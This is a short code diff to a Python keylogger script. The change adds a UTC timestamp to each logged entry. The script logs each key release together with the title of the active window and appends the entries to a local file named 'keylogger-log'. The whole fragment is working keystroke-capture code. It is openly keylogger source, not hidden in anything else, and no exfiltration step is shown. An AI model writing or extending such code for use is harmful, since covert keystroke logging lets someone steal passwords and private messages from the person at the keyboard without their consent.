@@ -43,7 +43,8 @@ while True:
     if 'up' in key: # log only key releases so no extra entries are made (often 2 key events are logged for when the key is pressed even though 1 character was typed because it is held for a moment)
         key = key[14:-3] # leave only the key name
         window_name = pyautogui.getActiveWindowTitle() # get the window name to know what context caused the keys to be pressed
-        entry = f"Key Pressed: {key} Active Window: {window_name}" # make the entry
+        time = str(datetime.now(timezone.utc))[:-13]  # get the current utc time, remove milliseconds portion
+        entry = f"Key Pressed: {key} Active Window: {window_name} Time: {time}" # make the entry
         print(entry) # for debugging purposes
         try:
             with open("keylogger-log", "a", encoding='utf-8') as log: # open the log file or make a new one if it doesnt exist
